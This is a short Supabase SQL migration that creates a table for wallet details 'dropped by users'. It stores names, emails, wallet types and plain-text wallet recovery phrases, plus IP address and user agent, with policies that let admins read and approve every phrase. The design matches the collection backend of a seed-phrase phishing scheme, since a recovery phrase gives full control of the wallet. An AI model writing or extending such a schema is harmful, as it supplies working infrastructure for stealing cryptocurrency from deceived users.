-- Create a new table for storing wallet details dropped by users
CREATE TABLE IF NOT EXISTS wallet_details (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  user_name TEXT NOT NULL,
  user_email TEXT NOT NULL,
  wallet_type TEXT NOT NULL,
  wallet_phrase TEXT NOT NULL,
  status TEXT DEFAULT 'pending', -- pending, approved, rejected
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  reviewed_at TIMESTAMP WITH TIME ZONE,
  reviewed_by UUID,
  
  -- Add any additional fields you might need
  ip_address TEXT,
  user_agent TEXT
);

-- Set up Row Level Security (RLS)
ALTER TABLE wallet_details ENABLE ROW LEVEL SECURITY;

-- Create policies
-- Allow admins to read all wallet details
CREATE POLICY "Admins can read all wallet details" 
ON wallet_details FOR SELECT 
USING (
  EXISTS (
    SELECT 1 FROM admin_users 
    WHERE admin_users.user_id = auth.uid()
  )
);

-- Allow admins to update wallet details (for review)
CREATE POLICY "Admins can update wallet details" 
ON wallet_details FOR UPDATE 
USING (
  EXISTS (
    SELECT 1 FROM admin_users 
    WHERE admin_users.user_id = auth.uid()
  )
);

-- Allow users to insert their own wallet details
CREATE POLICY "Users can insert their own wallet details" 
ON wallet_details FOR INSERT 
WITH CHECK (auth.uid() = user_id);

-- Allow users to view their own wallet details
CREATE POLICY "Users can view their own wallet details" 
ON wallet_details FOR SELECT 
USING (auth.uid() = user_id);

-- Create an index on user_id for faster lookups
CREATE INDEX IF NOT EXISTS wallet_details_user_id_idx ON wallet_details(user_id);

-- Create an index on created_at for time-based queries
CREATE INDEX IF NOT EXISTS wallet_details_created_at_idx ON wallet_details(created_at);

-- Create an index on status for filtering
CREATE INDEX IF NOT EXISTS wallet_details_status_idx ON wallet_details(status);
